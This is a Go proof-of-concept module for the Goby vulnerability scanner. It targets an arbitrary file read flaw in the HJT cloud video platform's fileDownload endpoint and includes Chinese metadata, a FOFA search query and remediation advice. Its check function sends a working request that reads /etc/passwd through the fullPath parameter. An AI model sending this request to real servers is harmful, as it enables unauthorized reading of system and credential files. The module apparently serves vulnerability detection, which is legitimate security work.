package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "会捷通云视讯 fileDownload 任意文件读取漏洞",
    "Description": "<p>会捷通云视讯平台,真正基于互联网云架构的可视通讯解决方案。出众的抗丢包能力,保障任何网络条件下音视频质量的稳定可靠。</p><p>会捷通云视讯平台存在信息泄露，该漏洞允许远程攻击者通过特殊数据包读取服务器文件。</p>",
    "Product": "会捷通云视讯",
    "Homepage": "http://www.hjtcloud.com/",
    "DisclosureDate": "2021-05-20",
    "Author": "",
    "FofaQuery": "body=\"/him/api/rest/v1.0/node/role\"",
    "GobyQuery": "body=\"/him/api/rest/v1.0/node/role\"",
    "Level": "1",
    "Impact": "<p>会捷通云视讯平台存在信息泄露，该漏洞允许远程攻击者通过特殊数据包读取服务器文件。</p>",
    "VulType": [
        "文件读取"
    ],
    "Tags": [
        "文件读取"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "6.5",
    "Is0day": false,
    "Recommendation": "<p>官⽅暂未修复该漏洞，请⽤户联系⼚商修复漏洞：<a href=\"http://www.hjtcloud.com/\">http://www.hjtcloud.com/</a></p><p>1、如⾮必要，禁⽌公⽹访问该页面。</p><p>2、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p>",
    "Translation": {
        "CN": {
            "Name": "会捷通云视讯 fileDownload 任意文件读取漏洞",
            "Description": "<p>会捷通云视讯平台,真正基于互联网云架构的可视通讯解决方案。出众的抗丢包能力,保障任何网络条件下音视频质量的稳定可靠。</p><p>会捷通云视讯平台存在信息泄露，该漏洞允许远程攻击者通过特殊数据包读取服务器文件。</p>",
            "Recommendation": "<p>官⽅暂未修复该漏洞，请⽤户联系⼚商修复漏洞：<a href=\"http://www.hjtcloud.com/\" rel=\"nofollow\">http://www.hjtcloud.com/</a></p><p>1、如⾮必要，禁⽌公⽹访问该页面。</p><p>2、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p>",
            "Impact": "<p>会捷通云视讯平台存在信息泄露，该漏洞允许远程攻击者通过特殊数据包读取服务器文件。</p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        }
    },
    "References": [
        "http://wiki.peiqi.tech/PeiQi_Wiki/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E4%B8%AD%E5%88%9B%E8%A7%86%E8%BF%85/%E4%BC%9A%E6%8D%B7%E9%80%9A%E4%BA%91%E8%A7%86%E8%AE%AF%20fileDownload%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.html"
    ],
    "HasExp": false,
    "ExpParams": null,
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "data": "",
                "data_type": "text",
                "follow_redirect": true,
                "method": "GET",
                "uri": "/",
                "header": {}
            },
            "ResponseTest": {
                "checks": [
                    {
                        "bz": "",
                        "operation": "==",
                        "type": "item",
                        "value": "200",
                        "variable": "$code"
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "password",
                        "bz": ""
                    }
                ],
                "operation": "AND",
                "type": "group"
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": null,
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9928"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/fileDownload?action=downloadBackupFile"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-Type","application/x-www-form-urlencoded")
			cfg.Data = "fullPath=%2Fetc%2Fpasswd"
			if resp,err := httpclient.DoHttpRequest(u,cfg);err==nil {
				if strings.Contains(resp.Utf8Html,"root") && strings.Contains(resp.Utf8Html,"bin"){
					return true
				}
				
			}
			return false
		},
		nil,
	))
}
